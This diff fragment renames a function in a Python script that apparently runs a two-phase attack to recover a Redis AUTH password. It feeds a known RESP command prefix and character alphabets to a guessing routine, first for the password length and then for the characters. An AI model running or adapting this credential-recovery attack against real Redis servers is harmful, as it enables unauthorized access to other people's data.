@@ -66,7 +66,7 @@ def fail(msg: str) -> "NoReturn":  # type: ignore[name-defined]
     sys.exit(1)
 
 
-def _run_attack_v2(variant: str, known_prefix: str, alphabet: str,
+def _run_attack(variant: str, known_prefix: str, alphabet: str,
                    max_length: int) -> dict:
     body = json.dumps({
         "variant": variant,
@@ -157,14 +157,14 @@ def main() -> int:
 
     RESP_PREFIX = "*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$"
     t0 = time.time()
-    r1 = _run_attack_v2("direct", RESP_PREFIX, "0123456789", 4)
+    r1 = _run_attack("direct", RESP_PREFIX, "0123456789", 4)
     if not r1.get("ok"):
         fail(f"phase 1 failed: {r1}")
     pw_len = r1["recovered"]
     print(f"  phase 1: length = {pw_len} ({r1['elapsed_seconds']:.1f}s, "
           f"{r1['total_guesses']} guesses)")
 
-    r2 = _run_attack_v2(
+    r2 = _run_attack(
         "direct", RESP_PREFIX + pw_len + "\r\n",
         "abcdefghijklmnopqrstuvwxyz0123456789", int(pw_len) + 4,
     )
